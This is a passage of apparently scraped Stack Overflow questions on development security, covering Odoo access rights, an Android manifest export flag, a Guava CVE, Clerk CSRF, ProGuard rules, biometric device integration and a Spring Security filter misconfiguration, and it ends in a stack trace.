<li>Clinic patinet (clinic.patient)</li>
</ul>
<p>thanks.</p>
<pre><code>val['groups_id'] = [(6, 0, [self.env.ref('clinic.group_clinic_patient').id])]
</code></pre>
<p>and 'clinic.group_clinic_patient' group in my security file like:</p>
<pre><code> &lt;record id=&quot;group_clinic_patient&quot; model=&quot;res.groups&quot;&gt;
        &lt;field name=&quot;name&quot;&gt;Patient&lt;/field&gt;
        &lt;field name=&quot;implied_ids&quot; eval=&quot;[(6, 0, [ref('base.group_portal')])]&quot;/&gt;
        &lt;field name=&quot;category_id&quot; ref=&quot;module_category_clinic&quot;/&gt;
    &lt;/record&gt;

</code></pre>
<p>and i am trying to give access on model for 'group_clinic_patient' group in this code :</p>
<pre><code>&lt;record id=&quot;patient_access_clinic_patient&quot; model=&quot;ir.model.access&quot;&gt;
        &lt;field name=&quot;name&quot;&gt;patient.access.clinic.patient&lt;/field&gt;
        &lt;field name=&quot;model_id&quot; ref=&quot;clinic.model_clinic_patient&quot;/&gt;
        &lt;field name=&quot;group_id&quot; ref=&quot;clinic.group_clinic_patient&quot;/&gt;
        &lt;field name=&quot;perm_read&quot;&gt;1&lt;/field&gt;
        &lt;field name=&quot;perm_write&quot;&gt;1&lt;/field&gt;
        &lt;field name=&quot;perm_create&quot;&gt;1&lt;/field&gt;
        &lt;field name=&quot;perm_unlink&quot;&gt;0&lt;/field&gt;
    &lt;/record&gt;

</code></pre>
<p>as u guys can see i set read access true.</p>
"
"<p>Use case: Canoe application accepts only one SeednKey.dll configuration in its panel configuration.
Vector supports ask me to create a new SeednKey.dll files which refers to my two main .dll files</p>
<p>Do anyone knows how to do this?</p>
<p>If yes, please share your information. Its highly appreciated</p>
<p>Canoe Seedkey.dll creation referring two other .dll files</p>
"
"<p>We are currently working on a Flutter mobile application and have had a recommendation by the Security Engineers that we have to make each Activity in the AndroidManifest.xml mark as not exportable:</p>
<pre><code>&lt;activity
 android:screenOrientation=&quot;landscape&quot;
 android:configChanges=&quot;keyboard|keyboardHidden|screenSize|orientation&quot;
 android:name=&quot;.activities.MainActivity&quot;
 android:exported=&quot;false&quot;&gt;
  &lt;intent-filter&gt;
   &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
   &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</code></pre>
<p>After we did this we faced different behavior on our uploaded app. After installation on all android devices the PlayStore crashed after trying to start the app. The exception is that the MainActivity is not exported. When I click on the app icon it has different results. On some devices the app starts as intended (Android 11, 12, 13) and on some devices the notification &quot;App not installed&quot; occurs and it wont start (seen also on Android 11/12). It had also occured on two equal devices from Samsung with different Android versions, one was working the other not. Even when the exception occurs, I am able to run the application by long tapping on the icon and go to App Info and click on start, then it runs on every device.</p>
<p>So the question is, am I missing something in the manifest, as far as I know I should be able to set the flag to false. But I dont find anything about this when I try to find a sample for Flutter. I know that I could set the flag to true and ignore this, but I would like to understand why I have to do this and is it just not possible for the MainActivity itself?</p>
"
"<p>I recently encountered a vulnerability in my Maven project while adding a dependency to my pom.xml. The vulnerability is reported as CVE-2023-2976 with a severity level of High, indicating a &quot;Files or Directories Accessible to External Parties&quot; vulnerability. The problematic dependency is com.google.guava:guava:31.1-jre.</p>
<p>Here are the specifics of my project setup:</p>
<ul>
<li>Spring Boot version: 3.2.2</li>
<li>Spring Security version: 6.2.1</li>
</ul>
<p>I attempted to mitigate the vulnerability by excluding the problematic dependency as follows:</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-saml2-service-provider&lt;/artifactId&gt;
    &lt;exclusions&gt;
        &lt;exclusion&gt;
            &lt;groupId&gt;org.opensaml&lt;/groupId&gt;
            &lt;artifactId&gt;opensaml-core&lt;/artifactId&gt;
        &lt;/exclusion&gt;
    &lt;/exclusions&gt;
&lt;/dependency&gt;
</code></pre>
<p>but the problem still exist</p>
"
"<p>We need clarification about CSRF security when using Clerk authentication with NextJs</p>
<p>The clerk docs seem to state that using clerk grants CSRF protection as long as we're not mutating data on navigation.</p>
<p><a href=""https://clerk.com/docs/security/csrf-protection"" rel=""nofollow noreferrer"">https://clerk.com/docs/security/csrf-protection</a></p>
<blockquote>
<p><strong>Do I need to take additional steps to prevent CSRF attacks?</strong>
You do not, but it is still possible to accidentally make your application vulnerable to XSS attacks.</p>
<p>Because Clerk uses the Lax setting, it is critical to remember that navigation alone should never trigger a mutation in your backend. Otherwise, the user can be tricked into clicking a link that takes an action they did not intend.</p>
</blockquote>
<ul>
<li>Does that apply to all form posts in our app?</li>
<li>Does it matter if we post JSON rather than form data?</li>
<li>Should we use CSRF tokens anyway?</li>
</ul>
"
"<p>For security reasons I would like to scan the git repo of all dependencies I'm including in my Java/Kotlin projects. Problem is that I don't see a way to automatically find the git repo of the mvn dependencies I'm using.</p>
<p>For npm/yarn I see the git repo in the meta info and so that is easy to do but mvn does not give that info. And might not always be available either...</p>
<p>Is there an automated way to get the source repo for my mvn dependencies?</p>
<p>MAG,
Milo</p>
"
"<p>just a quick question. Do you suggest to get started in Cybersecurity with Letsdefend pathway with VIP membership, or suggest Cisco Skills for All, Junior Cyber Security Technician pathway? Would appreciate all kinds of suggestions.</p>
<p>Would appreciate the help guys.</p>
"
"<p>I'm a beginner Android developer facing a challenge with Proguard while using Dagger Hilt for dependency injection in my project. Despite trying various solutions, I'm still encountering errors related to missing classes generated by Dagger Hilt.</p>
<p>In essence, when attempting to build my app, I receive errors indicating missing classes from Dagger Hilt, even after implementing Proguard rules suggested in the Dagger repository. This issue has proven to be quite stubborn, and I'm seeking guidance from the community to resolve it.</p>
<p>Could someone experienced with Dagger Hilt and Proguard offer insights into properly configuring Proguard to address these errors? here is my code in my project:</p>
<p>// proguard-rules.pro</p>
<pre><code>  # Keep file R and Manifest
    -keep class **.R
    -keep class **.R$* {*;}
    -keep class **.BuildConfig {*;}
    -keep class **.Manifest {*;}

    -keep class androidx.constraintlayout.motion.widget.KeyAttributes { *; }


    # Keep Dependency Injection Framework related classes and methods
    -keep class dagger.hilt.** { *; }
    -keep class javax.inject.** { *; }
    -keep class javax.annotation.** { *; }

    # Keep Model and Repository Classes
    -keep class com.example.core.data.model.** { *; }
    -keep class com.example.core.data.repo.** { *; }

    # Keep ViewModels
    -keep class * extends androidx.lifecycle.ViewModel

    # Keep Parcelable Classes
    -keep class * implements android.os.Parcelable {
        public static final android.os.Parcelable$Creator *;
    }

    # Keep UI-related classes
    -keep class com.example.ui.activity.** { *; }
    -keep class com.example.ui.fragment.** { *; }
    -keep class com.example.service.** { *; }

    # Menjaga semua kelas dalam paket tertentu
    -keep class com.example.package.** { *; }

    # Menjaga semua kelas yang disebutkan dalam file tertentu
    #-keep @com.example.rules.txt


    # Menjaga kelas model
    -keep class com.example.model.** { *; }

    # Menjaga kelas service
    -keep class com.example.service.** { *; }

    # Menjaga kelas-kelas yang diperlukan untuk penanganan SSL/TLS
    -keep class okhttp3.internal.platform.ConscryptPlatform {*;}
    -keep class okhttp3.internal.platform.OpenJSSEPlatform {*;}
    -keep class org.bouncycastle.** {*;}
    -keep class org.conscrypt.** {*;}
    -keep class org.openjsse.** {*;}


    # Keep classes required by OpenJSSE
    -keep class sun.security.x509.** { *; }
    -keep class sun.util.logging.** { *; }

    -keep class com.example.projectone.GithubUserApplication { *; }
    -keep class com.example.projectone.ui.main.MainActivity { *; }
    -keep class com.example.projectone.ui.userdetail.DetailUserActivity { *; }

# Keep classes generated by Hilt
    -keep class com.example.projectone.*Hilt* {
        *;
    }
# Keep Hilt generated classes
-keep class com.example.projectone.Hilt_* {*;}
-keep,allowobfuscation,allowshrinking @dagger.hilt.EntryPoint class *
-keep,allowobfuscation,allowshrinking @dagger.hilt.android.EarlyEntryPoint class *


</code></pre>
<p>// missing_rules.txt</p>
<pre><code>-dontwarn com.example.projectone.Hilt_GithubUserApplication
-dontwarn com.example.projectone.ui.main.Hilt_MainActivity
-dontwarn com.example.projectone.ui.userdetail.Hilt_DetailUserActivity
</code></pre>
<p>here is the error</p>
<blockquote>
<p>Missing class com.example.projectone.Hilt_GithubUserApplication (referenced from: void com.example.projectone.GithubUserApplication.() and 1 other context)</p>
</blockquote>
<blockquote>
<p>Missing classes detected while running R8. Please add the missing classes or apply additional keep rules that are generated in missing_rules.txt (see the file above)</p>
</blockquote>
<blockquote>
<p>Missing class com.example.projectone.ui.main.Hilt_MainActivity (referenced from: void com.example.projectone.ui.main.MainActivity.() and 5 other contexts)</p>
</blockquote>
<blockquote>
<p>Missing class com.example.projectone.ui.userdetail.Hilt_DetailUserActivity (referenced from: void com.example.projectone.ui.userdetail.DetailUserActivity.() and 5 other contexts)</p>
</blockquote>
<blockquote>
<p>Caused by: [CIRCULAR REFERENCE: com.android.tools.r8.utils.b: Missing class com.example.projectone.Hilt_GithubUserApplication (referenced from: void com.example.projectone.GithubUserApplication.() and 1 other context)</p>
</blockquote>
<p>Any assistance or advice would be greatly appreciated. Thank you for your time and your support.</p>
"
"<p>Pardon me if this is a ridiculous question. But can props be forged in React? In other words can someone navigating your website find a way to deliberately change the values of the props that are being passed from component to component in a manipulative way to bypass the natural flow of your website?</p>
"
"<p>I went to the library and borrowed the Black Hat Python book to learn hacking knowledge, but after the author used the IP address of 127.0.0.1, my python script was unable to return data, and Google couldn't find the reason why. The script will get stuck in server.accept() and cannot capture the data. Please help me. Thank you.</p>
<pre><code>import socket
import threading

IP=&quot;0.0.0.0&quot;
PORT=9998

def main():
    server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))#告訴伺服器監聽ip位址及埠號。
    server.listen(5)#開始監聽。
    print(f&quot;[*] Listening on {IP}:{PORT}&quot;)

    while True:
        client, address=server.accept()#將客戶端socket存放到client變數，將遠端連線的詳細資訊存放於address變數中。
        print(f&quot;[*] Accepted connection from {address[0]}:{address[1]}&quot;)
        client_handler=threading.Thread(target=handle_client, args=(client, ))
        client_handler.start()#啟動執行序處理客戶端連線。

def handle_client(client_socket):#伺服氣在的主迴圈就能繼續處理另一個連線，handle_client函式。
    with client_socket as sock:
        request=sock.recv(1024)
        print(f&quot;[*] Received: {request.decode(&quot;utf-8&quot;)}&quot;)
        sock.send(b&quot;ACK&quot;)

if __name__==&quot;__main__&quot;:
    main()
</code></pre>
"
"<p>I have WordPress website and use domain after publish on domain x. I find that work good on x.com but find same design and pages on api.y.com.</p>
<p>I need solve this problem. how it is on another domain if i not publish on it and y.com this website work for company.</p>
"
"<p>I am encountering issues while trying to fetch SMS information from a ZK-Teco device using Java code. Although I can manually convert the response byte code to a string and display the content correctly, the code implementation is not functioning as expected. I have shared the relevant code and repository link on my GitHub. The specific problem lies in how the code processes the response from the device, and I am seeking guidance on how to troubleshoot and resolve these issues.(content work well)</p>
<p>Additional info(protocol): <a href=""https://github.com/adrobinoga/zk-protocol/"" rel=""nofollow noreferrer"">https://github.com/adrobinoga/zk-protocol/</a>
My repo : <a href=""https://github.com/virtualheart/ZKteck-biomatric-lib"" rel=""nofollow noreferrer"">https://github.com/virtualheart/ZKteck-biomatric-lib</a></p>
<pre><code>response byte:208 7 170 57 137 177 3 0 253 1 0 0 0 0 0 160 174 251 45 65 106 84 109 97 97 100 106 106 97 109 51 54 49 54 59 59 46 58 59 33 63 87 106 109 103 116 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
content: AjTmaadjjam3616;;.:;!?Wjmgt
id : 1
Start date : 02-01-24
Start time : 12:56 AM
Expried Time(m) : 0

short meassage data structure
typedef struct _SMS_{
 U8 Tag; // category, public short message, non- public short message .。
 U16 ID; // data content marked 0 to express the record already invalid
 U16 ValidMinutes; // effective minute ， 0 = permanent 。
 U16 Reserved;
 U32 StartTime; // Start time
 U8 Content[MAX_SMS_CONTENT_SIZE+1]; // short message content ，MAX_SMS_CONTENT_SIZE=60
}TSms, *PSms;
</code></pre>
<pre><code>public SmsInfo getYourSmsList(int smsUId) throws IOException, ParseException {
            int[] smsIdArray = new int[]{smsUId &amp; 0xFF, (smsUId &gt;&gt; 8) &amp; 0xFF};

            int[] toSend = ZKCommand.getPacket(CommandCode.CMD_SMS_RRQ, sessionId, replyNo, smsIdArray);
            byte[] buf = new byte[toSend.length];
            int index = 0;

            for (int byteToSend : toSend) {
                buf[index++] = (byte) (byteToSend &amp; 0xFF);
            }

            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, port);
            socket.send(packet);
            replyNo++;

            int[] response = readResponse();
            CommandReplyCode replyCode = CommandReplyCode.decode(response[0] + (response[1] * 0x100));
            int replyId = response[6] + (response[7] * 0x100);

            int[] payloads = new int[response.length - 8];
            System.arraycopy(response, 8, payloads, 0, payloads.length);
            System.out.println(response.length);
            if (replyCode == CommandReplyCode.CMD_ACK_OK) {
                int tag = response[8] &amp; 0xFF;
                int id = Short.reverseBytes((short) response[9]) &amp; 0xFFFF;
                int validMinutes = Short.reverseBytes((short) response[10]) &amp; 0xFFFF;
                int reserved = Short.reverseBytes((short) response[11]) &amp; 0xFFFF;
                        
                long startTime = Integer.reverseBytes(response[12]) &amp; 0xFFFFFFFFL;

                int contentOffset = 19;  
                byte[] contentBytes = new byte[321];
                for (int i = 0; i &lt; 321; i++) {
                    contentBytes[i] = (byte) (response[i + contentOffset] &amp; 0xFF);
                }

                String content = new String(contentBytes, StandardCharsets.UTF_8).trim();
                SecurityUtils.printUnsignedBytes(contentBytes);
                return new SmsInfo(tag, id, validMinutes, reserved, startTime, content);
           }
           return null;            
        }
</code></pre>
<p>However, there seems to be an issue with the code itself as it's not functioning as expected. I expected the code to successfully fetch and process the SMS data from the device. I have attached the relevant code and provided a reference to my GitHub repository for further inspection. Any guidance or assistance in identifying and resolving the issue would be highly appreciated. Thank you.</p>
"
"<p>how to pull data automatically from iFace 702 and update it in the database?</p>
<p>i only tried the manual backup. im using vb.net. it is already displaying in my system but i want it to be automatically backup. is there any suggestion for me to do?</p>
"
"<p>I have a ZTK eco biometric for employee pointing, and I want to make it communicate directly with my REST API to exchange data pointing automatically.
Is it possible ?</p>
"
"<p>I am working on an Angular web application that uses the DigitalPersona 4500 fingerprint reader device u are u. The application aims to register fingerprints and store them in a database for later comparison to grant access.</p>
<p>Currently I already have the fingerprint registration and storage, I am storing the fingerprint in my database as binaries:
(<a href=""https://i.stack.imgur.com/g4PQT.png"" rel=""nofollow noreferrer"">https://i.stack.imgur.com/g4PQT.png</a>)</p>
<p>Given that the application is entirely web-based and nothing is stored locally, I'm seeking guidance on how to validate fingerprints within this environment. Any insights or suggestions on suitable approaches or tools for fingerprint validation in a web context would be greatly appreciated.</p>
"
"<p>I have a springboot app, and I'm trying to create two filters, one for the API and another one for the GUI, that's why I'm using &quot;securityMatcher&quot;. Right now I am testing with the api filter only.</p>
<p>When I send a request with the correct credentials, it works just fine. But when I send invalid credentials or I do not include the authentication I get a 404, as if the endpoint didn't exist, instead of a 403/401. It seems as if it was falling trough the filter without being intercepted properly. As for what I understand, the securityMatcher should intercept this request (since it is for /api/something) and if it is not authenticated reply a 403 right away instead of continuing down the rest of the filters, am I mistaken?</p>
<p><strong>This is my filter config:</strong></p>
<pre><code>@Bean
public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) throws Exception{
    http
        .securityMatcher(&quot;/api/**&quot;)
        .csrf(csrf-&gt;csrf.disable())
        .authorizeHttpRequests(
            configurer -&gt; configurer
                    .anyRequest().authenticated()
        )
        .httpBasic(Customizer.withDefaults());
    return http.build();
}
</code></pre>
<p><strong>This is the trace when I send an unauthenticated request:</strong></p>
<pre><code>2024-03-07T14:07:38.852-03:00  INFO 4016 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Trying to match request against DefaultSecurityFilterChain [RequestMatcher=Or [Mvc [pattern='/api/**']], Filters=[org.springframework.security.web.session.DisableEncodeUrlFilter@54052db, org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@648d6e28, org.springframework.security.web.context.SecurityContextHolderFilter@6e5c0033, org.springframework.security.web.header.HeaderWriterFilter@28c8caa6, org.springframework.web.filter.CorsFilter@345b636a, org.springframework.security.web.authentication.logout.LogoutFilter@18dbee52, org.springframework.security.web.authentication.www.BasicAuthenticationFilter@422e9db2, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@3083f3b9, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@78fb417b, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@22ebb5e, org.springframework.security.web.access.ExceptionTranslationFilter@7d16b4d6, org.springframework.security.web.access.intercept.AuthorizationFilter@1538a7d4]] (1/1)
2024-03-07T14:07:38.853-03:00 DEBUG 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Securing POST /api/telemetry
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking DisableEncodeUrlFilter (1/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking WebAsyncManagerIntegrationFilter (2/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking SecurityContextHolderFilter (3/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking HeaderWriterFilter (4/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking CorsFilter (5/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking LogoutFilter (6/12)
2024-03-07T14:07:38.853-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.w.a.logout.LogoutFilter            : Did not match request to Or [Ant [pattern='/logout', GET], Ant [pattern='/logout', POST], Ant [pattern='/logout', PUT], Ant [pattern='/logout', DELETE]]
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.security.web.FilterChainProxy        : Invoking BasicAuthenticationFilter (7/12)
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.w.a.www.BasicAuthenticationFilter  : Found username 'admin' in Basic Authorization header
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] w.c.HttpSessionSecurityContextRepository : Did not find SecurityContext in HttpSession A55EEDF1AE9AC3C5428BA15A466F010C using the SPRING_SECURITY_CONTEXT session attribute
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] .s.s.w.c.SupplierDeferredSecurityContext : Created SecurityContextImpl [Null authentication]
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] .s.s.w.c.SupplierDeferredSecurityContext : Created SecurityContextImpl [Null authentication]
2024-03-07T14:07:38.854-03:00 TRACE 4016 --- [nio-8080-exec-1] o.s.s.authentication.ProviderManager     : Authenticating request with DaoAuthenticationProvider (1/1)
2024-03-07T14:07:39.012-03:00 DEBUG 4016 --- [nio-8080-exec-1] o.s.s.a.dao.DaoAuthenticationProvider    : Failed to authenticate since password does not match stored value
2024-03-07T14:07:39.014-03:00 DEBUG 4016 --- [nio-8080-exec-1] o.s.s.w.a.www.BasicAuthenticationFilter  : Failed to process authentication request

org.springframework.security.authentication.BadCredentialsException: Bad credentials
    at org.springframework.security.authentication.dao.DaoAuthenticationProvider.additionalAuthenticationChecks(DaoAuthenticationProvider.java:89) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.authentication.dao.AbstractUserDetailsAuthenticationProvider.authenticate(AbstractUserDetailsAuthenticationProvider.java:147) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:182) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.authentication.ProviderManager.authenticate(ProviderManager.java:201) ~[spring-security-core-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilterInternal(BasicAuthenticationFilter.java:187) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.3.jar:6.1.3]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.3.jar:6.1.3]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:167) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:90) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:482) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:115) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:340) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:391) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:896) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1744) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-10.1.18.jar:10.1.18]
